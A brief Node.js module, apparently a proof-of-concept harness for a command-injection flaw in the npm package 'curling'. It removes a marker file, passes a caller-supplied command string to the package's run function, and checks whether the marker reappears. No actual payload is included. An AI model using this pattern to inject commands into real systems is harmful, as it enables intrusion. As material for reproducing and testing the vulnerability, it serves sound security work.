function exploitFunction(command) {
  const root = require("curling");
  const fs = require("fs");
  const path = "./curling";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  root.run(command, function (err) {
    if (err) throw err;
    else {
      file_exist = fs.existsSync(path);
      fs.unlink(path, function (err) {});
    }
  });
}

module.exports = { exploitFunction };